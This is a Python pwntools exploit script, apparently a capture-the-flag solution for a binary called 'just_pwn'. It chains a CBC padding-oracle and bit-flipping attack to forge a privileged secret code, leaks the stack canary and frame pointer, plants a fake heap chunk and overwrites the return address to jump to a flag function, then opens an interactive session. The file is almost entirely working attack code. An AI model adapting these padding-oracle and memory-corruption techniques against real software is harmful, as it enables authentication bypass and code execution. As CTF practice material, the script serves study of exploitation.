from pwn import *

just_pwn = process('./just_pwn')
#just_pwn = remote('118.25.148.66',2333)

def getCipher():
    Cipher = ''
    just_pwn.sendlineafter("3.Exit\n","1")
    just_pwn.recvuntil("These is your secretcode:\n")
    recv = just_pwn.recvline().replace('\n','')
    Cipher = recv.split('=')[3][:-1]
    just_pwn.sendline("2")
    return Cipher    

def getData():
    just_pwn.sendline("3")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","y")
    just_pwn.sendlineafter("buy my software:\n","aaaaaaaa")
    just_pwn.recvuntil("So your reason is:\n")
    recv = just_pwn.recvuntil("But")
    canary = u64(recv[9:16].rjust(8,'\x00'))
    ebp = u64(recv[16:22].ljust(8,'\x00'))
    print hex(canary)
    print hex(ebp)
    
    just_pwn.sendline("3")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","n")
    just_pwn.sendlineafter("y to confirm\n","y")
    just_pwn.sendlineafter("buy my software:\n",'a'*23)
    recv = just_pwn.recvuntil("So your reason is:\n")
    recv = just_pwn.recvuntil("But")
    addr = u64(recv[24:30].ljust(8,'\x00')) - 0xa3 + 0x50
    print hex(addr)
    return [canary, ebp, addr]
#0x00007fffffffdb60 ebp
#0x00007fffffffdbc0 ebp-0x60+0xc0

def setHOSandGetShell(ebp, canary, addr):
    just_pwn.sendline("1")
    just_pwn.sendlineafter("long is your message?\n","32")
    just_pwn.sendlineafter("content of your message:\n",p64(0) + p64(0x51))
    just_pwn.sendlineafter("title of your message:\n",32*'a'+p64(ebp-0x60+0xc0))
    just_pwn.sendlineafter("pushing? y to confirm.\n","n")
    just_pwn.sendlineafter("like to change? y to confirm.\n","y")
    just_pwn.sendlineafter("long is your message?\n","64")
    just_pwn.sendlineafter("content of your message:\n",'a'*3*8+p64(canary)+'a'*3*8+p64(addr))
 

def isLegal():
    just_pwn.recvline()
    recv = just_pwn.recvline().replace('\n','')
    if(recv == 'Your secret code is broken.'):
        #print '###'+recv+'###'
        return 1
    elif(recv == 'No access.'):
        #print '###'+recv+'###'
        return 2
    else:
        #print '###'+recv+'###'
        return 0

def nListToXorstr(numberList, padding):
    if numberList == []:
        return ''
    string = ''
    for i in numberList:
        string = string + hex(i^padding)[2:].upper().rjust(2,'0')
    return string


def padding_oracle(head, needtest, rear):
    List_beforeXor = []
    testing = ''
    padding = 1
    while needtest != '':
        testing = needtest[-2:]
        needtest = needtest[:-2]
        number = 0
        for number in range(0, 256):
            number_hex = hex(number)[2:].upper().rjust(2,'0')
            #print str(padding) +' ' +hex(number)+' '+ number_hex + ' tested'############
            if padding == 1 and number_hex == testing:    continue
            payload = head + needtest + number_hex + nListToXorstr(List_beforeXor, padding) + rear
            #print payload
            just_pwn.sendline(payload)
            if isLegal() == 2: break
        List_beforeXor = [number^padding] + List_beforeXor
        #print List_beforeXor
        padding += 1
    return List_beforeXor

def setDecryption(string, BeforeXorList):
    newDecryption = ""
    for i in range(0, 16):
        newDecryption += hex(BeforeXorList[i]^ord(string[i]))[2:].upper().rjust(2,'0')
    return newDecryption

Cipher = getCipher()
just_pwn.recvuntil("3.Exit\n")
iv = '31323334353637386162636465666768'
Cipherpart0 = Cipher[0:32]
Cipherpart1 = Cipher[32:64]
Cipherpart2 = Cipher[64:96]
list1 = []
for i in range(0,16):
    list1.append(ord("04;guestname:use"[i]) ^ int(Cipherpart0[2*i:2*(i+1)],16))
Cipherpart0 =  setDecryption("99;guestname:use", list1)

list2 = padding_oracle('iv=', iv, ';CipherLen=0032;CipherText=' + Cipherpart0 + ';')
iv = setDecryption("guest_account:99",list2)
padding = 'iv=' + iv + ';CipherLen=0096;CipherText=' + Cipherpart0 + Cipherpart1 + Cipherpart2 + ';'
just_pwn.sendline(padding)


datalist = getData()
canary = datalist[0]
ebp = datalist[1]
addr_buybuybuy = datalist[2]

addr_getflag = addr_buybuybuy +0x122C - 0x176F
setHOSandGetShell(ebp,canary,addr_getflag)

#gdb.attach(just_pwn)
just_pwn.interactive()
